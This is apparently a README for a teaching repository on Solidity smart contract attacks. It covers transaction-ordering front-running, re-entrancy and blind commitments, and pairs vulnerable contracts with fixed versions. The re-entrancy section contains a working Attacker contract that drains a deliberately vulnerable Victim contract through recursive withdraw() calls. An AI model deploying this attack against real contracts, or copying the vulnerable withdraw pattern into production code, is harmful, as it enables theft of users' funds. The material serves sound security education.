# Smart Contract Attacks

Creating Contracts and Testing possible Attacks

## Prerequisites

Install Truffle via npm

```
npm i -g truffle
```

## Setup

I am using [Solidity Remix online compiler](https://remix.ethereum.org) to deploy and manually test contract attacks.

This is due to the current difficulty of simulating race conditions in certain tests as testrpc (to my knowledge) cannot behave like a miner, namely mining transactions with higher gas fees first regardless of the order of transactions received.

## Transaction Ordering Attacks

A Transaction Ordering Attack is a race condition attack. Two transactions will be sent to the mempool/tx-pool, the order in which they are sent is irrelevant. The gas sent with the transaction is vital in this scenario as it incentivizes miners to mine their transactions first.

### Scenario - Pre Solution:
Contract is deployed at: 0xfd3673a4fd729ee501cbacd4aac97741e287d318

Pre-Solution Contract is:
```
TransactionOrdering.sol
```

Participants:

    * Buyer 

    * Owner of Contract

Contract:

    * uint256 price: Storage Variable

    * buy(): Function to "buy a virtual good" at the price set at the Storage Variable

    * setPrice(): Function used by the owner of the Contract to update the Price storage variable
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    pragma solidity ^0.4.18;

    contract TransactionOrdering {
        uint256 price;
        address owner;
        
        event Purchase(address _buyer, uint256 _price);
        event PriceChange(address _owner, uint256 _price);
        
        modifier ownerOnly() {
            require(msg.sender == owner);
            _;
        }

        function TransactionOrdering() {
            // constructor
            owner = msg.sender;
            price = 100;
        }

        function buy() returns (uint256) {
            Purchase(msg.sender, price);
            return price;
        }

        function setPrice(uint256 _price) ownerOnly() {
            price = _price;
            PriceChange(owner, price);
        }
    }

1. The buyer will call the buy() to purchase the virtual good at the price specified in the storage variable with a starting price=100.

2. The contract owner will call setPrice() and update the price storage variable to price=150.

3. The contract owner will send the transaction with a higher gas fee.

4. Contract owner's transaction will be mined first, updating the state of the contract due to the higher gas fee.

5. Buyers transaction gets mined soon after, but now the buy() function will be using the new updated price=150.

6. Buyer sends buy() to buy at price=100 but after the transaction is complete, the buyer has bought the "virtual goods" at price=150, since the contract owners transaction was mined before the buyer even though the buyer sent the transaction to the mempool/txpool first, thus updating the price storage variable before buyers transaction is complete.


### Scenario - Solution:

Contract is deployed at: 0x1abfe2f12447e877cb1bfe91a4e7eed0251b4d56

Solution Contract is:
```
SolutionTransactionOrdering.sol
```

Contract: 
```
pragma solidity ^0.4.18;

contract SolutionTransactionOrdering {
  uint256 price;
  uint256 txCounter;
  address owner;
  
  event Purchase(address _buyer, uint256 _price);
  event PriceChange(address _owner, uint256 _price);
  
  modifier ownerOnly() {
    require(msg.sender == owner);
    _;
  }
  function getPrice() constant returns (uint256) {
    return price;
  }

  function getTxCounter() constant returns (uint256) {
    return txCounter;
  }

  function SolutionTransactionOrdering() {
    // constructor
    owner = msg.sender;
    price = 100;
    txCounter = 0;
  }

  function buy(uint256 _txCounter) returns (uint256) {
    require(_txCounter == txCounter);
    Purchase(msg.sender, price);
    return price;
  }

  function setPrice(uint256 _price) ownerOnly() {
    price = _price;
    txCounter += 1;
    PriceChange(owner, price);
  }
}
```

1. Buyer now has to send a txCounter uint value, this will be linked to the current price.

2. If the txCounter doesn't match the one in the contract, then transaction is reverted.

3. When contract owner updates the price, txCounter is incremented.

4. Now if contract owner beats buyer in transaction ordering, the buyers transaction will be reverted since txCounter does not match thus signifying price has changed.


## Re-entrancy Attack
An attack where a malicious contract can call a withdraw(), to withdraw funds from a contract. As soon as the funds hit the attacking contract, it recalls withdraw(), this can be seen as a recursive loop attack, exploiting the order of commands in the Victim contract when it comes to updating the state of the contract.

### Scenario - Pre Solution:

Pre-Solution Contract is:
```
Attacker.sol

Victim.sol
```

Tests are located at: 

```
./test/presolution_reentrancy_test.js
```

Participants:

    * Malicious User

    * Attacking Contract

    * Victim Contract

Contract:

Victim:

  * Victim Contract will act as a generic contract that maps users deposits to their address

  * When the withdraw function is called, it will check if the msg.sender has a mapping and if it is above 0 (eligible to withdraw funds)

  * It will then send the funds according to the balance mapped for the msg.sender

  * It will update the state of the msg.sender balance to 0

```
pragma solidity ^0.4.18;

contract Victim {
  
  mapping (address => uint) public balances;

  event WithdrawEvent(address _sender, uint amount);

  function Victim() {
  }

  function deposit() payable {
    balances[msg.sender] = msg.value;
  }

  function getBalance() constant returns (uint) {
    return balances[msg.sender];
  }

  function() payable {
    // this.deposit();
    balances[msg.sender] = msg.value;
  }

  function withdraw() {
    WithdrawEvent(msg.sender, balances[msg.sender]);

    require(balances[msg.sender] > 0);

    if (!msg.sender.call.value(balances[msg.sender])()) {
      revert();
    } 

    balances[msg.sender] = 0;
  }

}
```

Attacker: 

* Attacker is init with the address of the deployed Victim Contract

* We also import the Victim Contract or the ADB to call functions on it

* When collect() is called, it will deposit 1 ether to the victim contract (to create a mapping balance for the attacker)

* Attacker will call withdraw immediately, which will withdraw the 1 ether from the Victim

* Ether will be paid to this contract, when that occurs, the fallback function will be executed, calling withdraw again upto 50 times (this is an arbitrary number), draining the Victim Contract of funds

```
pragma solidity ^0.4.18;

import './Victim.sol';

contract Attacker {

  Victim public victim;
  uint public count;

  event LogFallback(uint _count, uint _balance);

  function Attacker(address _victim) {
    victim = Victim(_victim);
  }

  function collect() payable {
    victim.deposit.value(msg.value)();
    victim.withdraw();
  }

  function kill() {
    selfdestruct(msg.sender);
  }

  function() payable {
    LogFallback(count, this.balance);
    count++;
    if (count < 50) {
      victim.withdraw();
    }
  }

}
```

1. Attacker calls collect() and sends 1 ether to the Victim Contract

2. Victim contract will map attackers address to value sent

3. Attacker immedietely calls withdraw()

4. Victim Contract checks that the attackers mapping has value greater than 0 (it does, since it sent 1 ether)

5. Victim Contract sends 1 ether to the Attacking Contract

6. When 1 ether is received at the Attacking Contract via the fallback function, victim.withdraw() is called again 50 times

7. The Victim Contract will continue sending Ether to the Attacking contract until count has reached 50


### Scenario - Solution:

Solution Contract is:
```
SolutionAttacker.sol

SolutionVictim.sol
```

Tests are located at: 

```
./test/solution_reentrancy_test.js
```

Participants:

    * Malicious User

    * Attacking Contract

    * Victim Contract

Contract:

Solution Victim:

  * Solution Victim now has 3 different methods to protect against reentrancy attacks:

  * noReentrancy Modifier

  * Using msg.sender.send instead of msg.sender.call.value to send amount to sender

  * Updating the state of the senders balance BEFORE sending the Ether to the sender

```
pragma solidity ^0.4.18;

contract SolutionVictim {
  
  mapping(address => uint) public balances;

  mapping(address => bool) public lockedState;

  modifier noReentrancy(address _sender) {
    require(!lockedState[_sender]);
    lockedState[_sender] = true;
    _;
    lockedState[_sender] = false;
  }

  event WithdrawEvent(address _sender, uint amount);

  function SolutionVictim() {
  }

  function deposit() payable {
    balances[msg.sender] = msg.value;
  }

  function getBalance() constant returns (uint) {
    return balances[msg.sender];
  }

  function() payable {
    balances[msg.sender] = msg.value;
  }

  function withdraw() noReentrancy(msg.sender) {
    WithdrawEvent(msg.sender, balances[msg.sender]);

    require(balances[msg.sender] > 0);
    uint valueOfBalance = balances[msg.sender];

    balances[msg.sender] = 0;

    if (!msg.sender.send(valueOfBalance)) {
      revert();
    } 
  }
}
```

1. Modifier _noReentrancy_ will "lock" the withdraw function while it is being called, if an attacker tries to recall withdraw() using a recursive attack, the call is reverted.

2. Replaced _msg.sender.call_ with _msg.sender.send()_, send() will make a transaction with a gas stipened of only 2300. The receiver's (attacker) fallback function will not be able to update storage variables or call any other functions with the receiving gas amount, the level of gas will only allow a logging event.

* msg.sender.call() can send as much gas as it likes, this has inherent security risks as it allows a malicious contract to use a reentrancy attack.

3. Very important method for protecting against Reentrancy, sets the storage mapping of the users balance to 0 BEFORE sending any Ether. If the attacker does manage to recurisvely call the withdraw function, the mapping will already be set to 0 and will not be able to transfer any Ether to the attacker.


## Blind Commitments
A way to prevent front running attacks, reorg attacks on the blockchain and submit information to a Smart Contract without revealing a key component (secret) and revealing it safely at a later point in time to claim a reward.

### Scenario 
The contract below will simulate a POW system, where users will submit a proof of work in the form of a `uint8 nonce`, the users will want this submission to be encrypted.

* Why?

* A malicious user, owner of the contract or a miner can front run the tx, by viewing the nonce that was submitted to the blockchain, they can create a tx that will be submitted before the honest users tx.

* A malicious miner can attempt a reorg attack, the miner will mine another block at the same height, submitting the same tx and nonce from another address. Now the longest chain will be considered the valid transaction and the miner can begin working on submitting blocks to their chain.

Contract:

```
pragma solidity ^0.4.4;

contract BlindCommitments {

  //Storage Variables
  bytes8 public difficultyTarget;
  uint256 public reward;
  address public owner;
  mapping (bytes8 => uint) commits;
  uint blockWait = 4;

  // constructor
  function BlindCommitments(uint256 initialReward, bytes8 difficulty) public {
    owner = msg.sender;
    reward = initialReward;
    difficultyTarget = difficulty;
  }

  // change difficulty
  function setDiff(bytes8 difficulty) external {
    require(owner == msg.sender);
    difficultyTarget = difficulty;
  }

  // mine for valid nonce
  function mine(uint8 nonce) external view returns (bytes8) {
    // hash nonce
    bytes8 res = bytes8(keccak256(bytes8(nonce)));

    // difficulty target check
    require(res >= difficultyTarget);

    // returns the blind commitment
    bytes8 c = bytes8(keccak256(bytes8(nonce) ^ bytes8(msg.sender)));
    
    return c;
  }

  //submit blind commitment
  function blindCommitment(bytes8 _c) external {
    commits[_c] = block.number;
  }

  // claim reward after X blocks
  function claimReward(uint8 nonce) public {
    // nonce must be valid for difficulty target
    bytes8 res = bytes8(keccak256(bytes8(nonce)));
    require(res >= difficultyTarget);

    // the nonce must have been sent blockWait blocks ago
    bytes8 c = bytes8(keccak256(bytes8(nonce) ^ bytes8(msg.sender)));
    require(commits[c] > 0 && (commits[c] + blockWait) < block.number);

    //transfer funds
    msg.sender.transfer(this.balance);
  }

  //
  function skipBlock() external returns (uint) {
     
  }
}
```

1. Contract is deployed with a difficulty target

2. Competing users will continously call `mine()` and submit their guess of the nonce

3. The user will know if their nonce is within the difficulty target because they will be returned an 8 bytes hash

4. The 8 bytes hash is keccak256() hash (which is sha3?) concatenated with the msg.sender address: This is the BLIND COMMITMENT

5. In this scenario, the winning user will call blindCommitment(bytes8 winningHash) and will be mapped in the contract to the blockNumber

6. The hash is important since:

  * Attackers cannot decipyher the nonce or the sending address

  * Attackers would need both pieces of information (nonce + senders address)

  * Even with both pieces of information, attacker would have to know senders private key and send the transaction from the winning users address

7. The user can claim the reward safely by revealing the secret when calling `claimReward(uint8 nonce)`

8. The user can only claim the reward after blocks, to defend against reorg attacksgit 
